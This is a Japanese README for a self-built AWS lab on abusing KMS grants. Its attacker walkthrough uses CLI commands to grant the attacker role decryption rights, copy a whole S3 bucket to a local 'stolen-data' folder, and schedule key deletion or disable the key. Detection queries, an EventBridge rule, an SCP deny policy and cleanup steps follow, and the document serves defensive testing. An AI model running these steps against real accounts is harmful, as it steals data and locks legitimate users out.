# KMSグラント悪用検証環境

## 攻撃シナリオ

1. **グラント作成権限の悪用**: 攻撃者が`CreateGrant`権限を使って自分自身に暗号化・復号化権限を付与
2. **S3オブジェクトの奪取**: グラントで取得した復号化権限を使ってKMS暗号化されたS3データを窃取
3. **KMSキーの無効化**: グラントを使ってキーを無効化し、正規ユーザーのデータアクセスを妨害（DoS攻撃）

## デプロイ（防御側アカウント）

```bash
cdk deploy --parameters AllowedAccountId=<攻撃者アカウントID>

# 出力値を記録（攻撃者に共有）
KEY_ID=$(aws cloudformation describe-stacks --stack-name PublicKmsStack \
  --query "Stacks[0].Outputs[?OutputKey=='KeyId'].OutputValue" --output text)

BUCKET=$(aws cloudformation describe-stacks --stack-name PublicKmsStack \
  --query "Stacks[0].Outputs[?OutputKey=='BucketName'].OutputValue" --output text)

ROLE_ARN=$(aws cloudformation describe-stacks --stack-name PublicKmsStack \
  --query "Stacks[0].Outputs[?OutputKey=='AttackerRoleArn'].OutputValue" --output text)

echo "KEY_ID=$KEY_ID"
echo "BUCKET=$BUCKET"
echo "ROLE_ARN=$ROLE_ARN"
```

## CloudShellでの検証手順（攻撃者アカウント）

### ステップ1: リソース情報を設定（防御側から共有された値）

```bash
# 防御側から共有された値を設定
export ROLE_ARN="arn:aws:iam::123456789012:role/KmsGrantAttackerRole"
export KEY_ID="12345678-1234-1234-1234-123456789012"
export BUCKET="publickmsstack-publickmsb-xxxxx"
```

### ステップ2: 攻撃者ロールにスイッチ

```bash
CREDS=$(aws sts assume-role --role-arn $ROLE_ARN --role-session-name attacker)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.Credentials.SessionToken')
```

### ステップ3: 初期状態の確認（アクセス拒否を確認）

```bash
# 暗号化データへのアクセスを試行（失敗するはず）
aws s3 cp s3://$BUCKET/secret.txt - 2>&1

# 現在のグラント一覧
aws kms list-grants --key-id $KEY_ID
```

### ステップ4: グラント作成で権限昇格

```bash
# 自分自身にDecrypt権限を付与するグラントを作成
GRANT_ID=$(aws kms create-grant \
  --key-id $KEY_ID \
  --grantee-principal $ROLE_ARN \
  --operations Decrypt GenerateDataKey \
  --query GrantId --output text)

echo "✓ Grant created: $GRANT_ID"
echo "⚠️  攻撃者が復号化権限を取得しました"
```

### ステップ5: S3オブジェクトの奪取

```bash
# グラントによる復号化権限を使ってS3データを窃取
aws s3 cp s3://$BUCKET/secret.txt - 2>&1

# バケット内の全オブジェクトをダウンロード
aws s3 sync s3://$BUCKET ./stolen-data/

echo "✓ S3オブジェクトの奪取に成功"
```

### ステップ6: KMSキーの無効化（DoS攻撃）

```bash
# さらにScheduleKeyDeletion権限を持つグラントを作成
DOS_GRANT_ID=$(aws kms create-grant \
  --key-id $KEY_ID \
  --grantee-principal $ROLE_ARN \
  --operations ScheduleKeyDeletion \
  --query GrantId --output text 2>&1)

if [[ $? -eq 0 ]]; then
  echo "✓ DoS Grant created: $DOS_GRANT_ID"
  
  # キーの削除をスケジュール（最短7日後）
  aws kms schedule-key-deletion --key-id $KEY_ID --pending-window-in-days 7
  
  echo "⚠️  KMSキーが無効化されました（7日後に削除予定）"
  echo "⚠️  正規ユーザーはデータにアクセスできなくなります"
else
  echo "✗ ScheduleKeyDeletion権限がありません"
  echo "代替: キーを無効化"
  
  # DisableKey権限でグラントを作成
  DISABLE_GRANT_ID=$(aws kms create-grant \
    --key-id $KEY_ID \
    --grantee-principal $ROLE_ARN \
    --operations DisableKey \
    --query GrantId --output text 2>&1)
  
  if [[ $? -eq 0 ]]; then
    aws kms disable-key --key-id $KEY_ID
    echo "⚠️  KMSキーが無効化されました"
  fi
fi
```

### ステップ7: 攻撃の影響確認

```bash
# キーの状態を確認
aws kms describe-key --key-id $KEY_ID --query 'KeyMetadata.KeyState'

# 作成したグラント一覧
aws kms list-grants --key-id $KEY_ID --query 'Grants[].{GrantId:GrantId,Operations:Operations}'
```

### ステップ8: クリーンアップ（オプション）

```bash
# 作成したグラントを削除
aws kms revoke-grant --key-id $KEY_ID --grant-id $GRANT_ID
[[ -n "$DOS_GRANT_ID" ]] && aws kms revoke-grant --key-id $KEY_ID --grant-id $DOS_GRANT_ID
[[ -n "$DISABLE_GRANT_ID" ]] && aws kms revoke-grant --key-id $KEY_ID --grant-id $DISABLE_GRANT_ID

# キーの削除をキャンセル（スケジュールされている場合）
aws kms cancel-key-deletion --key-id $KEY_ID 2>/dev/null

# キーを再有効化
aws kms enable-key --key-id $KEY_ID 2>/dev/null

# 認証情報をリセット
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN

echo "✓ クリーンアップ完了"
```

## 検出・監視方法

### CloudTrailで監視すべきイベント

```bash
# 危険なKMS操作を検索
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateGrant \
  --max-results 10

aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=ScheduleKeyDeletion \
  --max-results 10

aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=DisableKey \
  --max-results 10
```

### グラント監査

```bash
# 危険な権限を持つグラントを検出
aws kms list-grants --key-id $KEY_ID \
  --query "Grants[?contains(Operations, 'CreateGrant') || contains(Operations, 'ScheduleKeyDeletion') || contains(Operations, 'DisableKey')]"
```

## 防御策

### 1. CreateGrant権限を最小限に制限

```typescript
// 危険な権限を除外
actions: ['kms:Encrypt', 'kms:Decrypt', 'kms:GenerateDataKey']
// 除外: CreateGrant, ScheduleKeyDeletion, DisableKey
```

### 2. グラント制約を必須化

```bash
aws kms create-grant --key-id $KEY_ID \
  --grantee-principal $PRINCIPAL \
  --operations Decrypt \
  --constraints EncryptionContextSubset={Environment=Production}
```

### 3. CloudTrail + EventBridge監視

```bash
aws events put-rule --name DetectKmsGrantAbuse \
  --event-pattern '{
    "source": ["aws.kms"],
    "detail-type": ["AWS API Call via CloudTrail"],
    "detail": {
      "eventName": ["CreateGrant", "ScheduleKeyDeletion", "DisableKey"]
    }
  }'
```

### 4. SCPでグラント操作を制限

```json
{
  "Effect": "Deny",
  "Action": [
    "kms:CreateGrant",
    "kms:ScheduleKeyDeletion",
    "kms:DisableKey"
  ],
  "Resource": "*",
  "Condition": {
    "StringNotEquals": {
      "aws:PrincipalOrgID": "o-xxxxxxxxxx"
    }
  }
}
```

### 5. 定期的なグラント監査と削除

```bash
aws kms list-grants --key-id $KEY_ID --query "Grants[].GrantId" --output text | \
  xargs -n1 -I {} aws kms revoke-grant --key-id $KEY_ID --grant-id {}
```

## 参考

- [AWS KMS Grants](https://docs.aws.amazon.com/kms/latest/developerguide/grants.html)
- [KMS Best Practices](https://docs.aws.amazon.com/kms/latest/developerguide/best-practices.html)
